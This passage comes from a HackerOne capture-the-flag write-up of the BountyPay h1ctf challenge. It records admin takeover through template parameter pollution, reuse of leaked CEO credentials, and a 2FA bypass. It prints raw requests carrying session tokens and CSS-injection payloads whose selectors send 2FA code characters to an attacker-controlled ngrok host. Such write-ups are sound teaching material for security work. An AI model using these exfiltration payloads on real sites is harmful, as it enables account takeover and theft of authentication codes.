1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4156.0 Safari/537.36\nReferer: https://staff.bountypay.h1ctf.com/?template=home\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n\nprofile_name=sandra&profile_avatar=tab1+upgradeToAdmin\n```\n\nNow our profile has the payload, so when we visit the page https://staff.bountypay.h1ctf.com/?template=home#tab1 it should trigger a request to `/admin/upgrade`. Alas, it calls with username undefined as there is no input tag with `input[name=\"username\"]` in the page. If only we could find a page where there's an input tag with the name `username`. The first thing that came into my mind was the login page. It has username and password both fields. So I tried visiting https://staff.bountypay.h1ctf.com/?template=login&username=sandra.allison and luckily the username was pre-filled:\n\n{F851448}\n\nThis page didn't have the javascript embedded as it is not required on the login page. Going back to the notes, this subdomain uses template param to generate dynamic pages on the fly so first intuition was HTTP Parameter pollution, by including both the things together: https://staff.bountypay.h1ctf.com/?template=login&username=sandra.allison&template=home. But this showed only the home template. Instantly, second thing from my programming instincts kicked in. How would a developer implement it? Using Arrays or something like that! So we try `template[]`:  `https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=home#tab1`\n\n{F851456}\n\nI tried submitting the URL but it didn't work and it kept me wondering why. Then I thought the admin report feature means that admin will open that page. That page will not contain my avatar as it is the home page. The only page where my avatar would be visible to the admin would be the tickets page. \n\nhttps://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1. I quickly and in an excitement, encoded `?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1` in base64 -> `P3RlbXBsYXRlW109bG9naW4mdXNlcm5hbWU9c2FuZHJhLmFsbGlzb24mdGVtcGxhdGVbXT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiMQ==` and submitted it to the report URL. It finally worked! \n\n{F851457}\n\nWe got another token cookie, which I manually inserted into the browser using `EditMyCookie` extension.\n\nWe got admin access after that and another tab was added which contained Marten's credentials.\n{F851458}\n\n# Final nail in the coffin\n- We have the CEO's credentials now. `marten.mickos` & `h&H5wy2Lggj*kKn4OD&Ype`. We login to https://app.bountypay.h1ctf.com/ and we are presented with a login 2FA which we can again bypass with the same way of MD5 hash which we did for Brian's account earlier when we were starting in the CTF.\n\n- The first tweet https://twitter.com/Hacker0x01/status/1266454022124376064 mentioned that the CEO needs to approve May payments, so I straightaway went and selected 05/2020 and got the transaction:\n\n{F851466}\n\nClicking on the pay button redirects us to yet another 2FA:\n\n{F851468}\n\nClicking on the Send Challenge button, the request gets sent:\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 73\nOrigin: https://app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4156.0 Safari/537.36\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\n\nNotice that there is `app_style` parameter which indicates that the page is including our custom CSS on the page. I verified this by giving a Burp Collaborator URL and it sure did receive a request from a browser with User-Agent: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/81.0.4044.138 HeadlessChrome/81.0.4044.138 Safari/537.36`. Straightaway, this pointed me towards Data Infiltration using CSS. I had read it first on @d0nut's article https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d.\n\n## What is Data Exfiltration using CSS?\n- So CSS can't execute arbitrary javascript code in the client side, but doesn't mean that it isn't less dangerous. For starters, if we are able to include our custom CSS, we can leak the URL of the page by using the referer of the page. Also, we can use CSS selectors in such a way that we can extract information about some object character by character.\n\nFor example,\n\nWe can use the following CSS to check if there exists a input tag with name starting with 'a':\n\n```css\ninput[name^=\"a\"]{\n    background-image: url(\"https://ourserver/?val=a\");\n}\n```\n\nBut checking one by one would be tiresome, so we include a series of such selectors to detect the first character. When the first character is detected, we can move onto another character like this:\n\n```css\ninput[name^=\"a\"]{\n    background-image: url(\"https://ourserver/?val=a\");\n}\ninput[name^=\"b\"]{\n    background-image: url(\"https://ourserver/?val=b\");\n}\n...\ninput[name^=\"9\"]{\n    background-image: url(\"https://ourserver/?val=9\");\n}\n```\n\nSo for solving this, I first tried with the known input names: `challenge_answer`, `challenge`, `challenge_timeout`. Turns out, none of them seemed to exist in the vulnerable page. I verified the existence by the following payload\n\n```css\ninput[name=\"challenge_answer\"]{\n    background-image: url(\"https://ourserver/challenge_answer_exists\");\n}\n```\n\nI did the same with the other three but didn't receive any callbacks for them.\n\n## Stage 1: Determining the input tag name\n\nI wrote a small hacky python script for generating CSS: {F851483}\n\n`python gen.py > css.css` and it would generate for first character. I would use ngrok to expose the css via Apache from my local computer. Give the ngrok path with css to the `app_style` parameter of the payment 2FA request.\n\nThen once we get first hit in collaborator, we would give it to the script and it would generate payload for the second character and so on.\n\nAfter a few trial and errors, got the first character `c`:\n\n{F851490}\n\nDoing this way, I got to `code_` and then when I fired the next payload, I got 7 requests, meaning we had 7 name tags: `name_1` to `name_7` which had to be exfiltrated.\n\n## Stage 2: Getting all those values and the flag\n\nWe know that it is of 7 characters due to 2 reasons: `<input name=\"challenge_answer\" class=\"form-control\" maxlength=\"7\">` and also due to the fact that `code_1` - `code_7` input tags exist on the vulnerable page.\n\nI tried extracting `name_1` first by using the manual approach. It seemed to be different everytime and also the fact that we had to collect 7 values from tags together and submit the 2FA code within 2 minutes seemed possible although hard to be done manually. Also, why to do a task in 10 minutes if it can be automated in 2 hours? :P\n\nCame to the conclusion that this will be easier to be automated and wrote up a Python server using flask which I exposed using ngrok: \n\n- Python Script: {F860033}\n- Start ngrok by `./ngrok http 5000`\n- Start the python script by `python twofactor.py https://ngrok.url` (Only `https` urls seem to work in this CTF)\n- Visit http://localhost:5000/start and flag will be displayed. Everything from submitting the request to getting the 2FA token and submitting it back to the application was automated.\n\nWe got the flag that is:  `736c635d8842751b8aafa556154eb9f3`. \n \n- Screenshot:\n{F851505}\n\n- Video:\n{F851504}\n\nAbout the script:\n- Creates a blank array with 7 elements\n- `/start` endpoint/function submits the post request to `https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba` with our ngrok URL (https://ngrok.url/css). This triggers the css url\n\n- `/css` endpoint: This endpoint is called by the vulnerable page. This endpoint returns our auto-generated CSS using the function `getFullCss` and with mime-type `text/css`\n\nIt is of the form:\n\n```css\n    input[name=\"code_1\"][value^=\"a\"]{\n        background-image: url(\"https://15d95cd78dd6.ngrok.io/exfil?name=code_1&val=a\");\n    }\n    \n...\n\n    input[name=\"code_7\"][value^=\"_\"]{\n        background-image: url(\"https://15d95cd78dd6.ngrok.io/exfil?name=code_7&val=_\");\n    }\n```\n\nIt covers all `code_1`-`code_7` \n\n- `/exfil` endpoint receives callbacks from the CSS. With each callback, it sets the particular value in the array. So for `?name=code_4&val=a`, array's 3rd element would be set to `a`. In this way, when the array is full, we send it along with the challenge_timeout and challenge we received.\n\nThis is one of the best automated solutions I have written till now for any CTF!\n\nTakeaways:\n- Don't always think too complicated, sometimes it's quite easy and in front of your eyes. Start with simpler stuff and go towards more complex stuff.\n- Keep trying and reading stuff and try everything you know, never assume anything.\n- Note taking is important as any information you discover might be helpful in the later part.\n- Think like a developer.\n- But most importantly: **Persistence: Don't give up** - this was the reason I was able to solve this CTF. It was 5 am in the morning on the second day of solving that I was able to solve this.\n\nRegards,\nYash",
      "user": {
        "id": 388246,
        "username": "yashrs",
        "name": "Yash Sodha",
        "bio": " Hacker and Developer. Passionate about keeping the cyber world secure :) ",
        "cleared": true,
        "verified": true,
        "website": "https://wittysec.com",
        "location": "",
        "created_at": "2018-10-27T02:09:57.665Z",
        "url": "https://hackerone.com/yashrs",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/S9WnJuUrpWvxZ6iM38qL2HE4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/S9WnJuUrpWvxZ6iM38qL2HE4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/S9WnJuUrpWvxZ6iM38qL2HE4/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
